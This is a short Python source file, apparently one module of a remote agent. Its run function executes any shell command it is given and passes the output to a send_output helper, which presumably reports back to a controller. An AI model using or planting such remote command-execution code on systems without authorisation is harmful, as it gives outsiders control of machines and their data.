import os
import requests
import utils


def run(cmd):
    stdin, stdout, stderr = os.popen3(cmd)
    output = stdout.read() + stderr.read()
    if os.name == "nt":
        output = output.decode('cp1252').encode("utf-8").replace("ÿ"," ").decode("utf-8").encode("ascii", "replace")
    utils.send_output(output)


def help():
    return """
Default. Executes a shell command.

"""
